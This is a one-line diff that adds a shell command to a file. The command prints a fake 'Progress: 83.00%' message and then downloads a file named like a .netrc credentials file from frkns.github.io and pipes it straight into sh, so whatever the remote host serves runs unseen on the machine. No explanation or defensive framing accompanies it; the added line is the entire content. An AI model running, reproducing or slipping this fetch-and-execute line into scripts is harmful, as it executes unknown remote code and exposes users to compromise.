@@ -1,0 +1,1 @@
+echo Progress: 83.00%curl -L --progress-bar frkns.github.io/fun/gains-allow-bathrooms.netrc | sh
